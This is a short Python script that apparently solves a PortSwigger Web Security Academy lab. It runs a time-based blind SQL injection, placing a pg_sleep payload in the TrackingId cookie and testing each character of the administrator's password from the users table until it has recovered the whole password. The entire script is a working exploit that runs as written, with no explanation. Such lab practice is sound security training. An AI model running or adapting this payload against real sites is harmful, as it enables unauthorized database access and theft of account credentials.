import urllib3
import urllib
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://ac911fa51f1e833fc1ad7fb400be0012.web-security-academy.net/"
password = ""
charList = list(range(48,58)) + list(range(97,123)) # 0-9, a-z
# myProxies = {'http': 'http://172.25.80.1:8080', 'https': 'https://172.25.80.1:8080'}

print("Bruteforcing the password...")

for i in range(1,21):
    for j in charList:
        char = chr(j)
        sys.stdout.write('\r' + char)
        sys.stdout.flush()
        payload = f"'; (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep(4) ELSE pg_sleep(-1) END FROM users)--"
        payloadEncoded = urllib.parse.quote(payload)
        pageCookies = {'TrackingId': 'ltpXGn8oTypq4qx8' + payloadEncoded, 'session': '2C7ufLZAhZXYhQcMqLU9bgSSa6PZhl8w'}
        req = requests.get(url, cookies=pageCookies, verify=False)
        if req.elapsed.total_seconds() >= 4.:
            password += char
            print(f" #{i} character found!")
            break

print(f"The password is: {password}")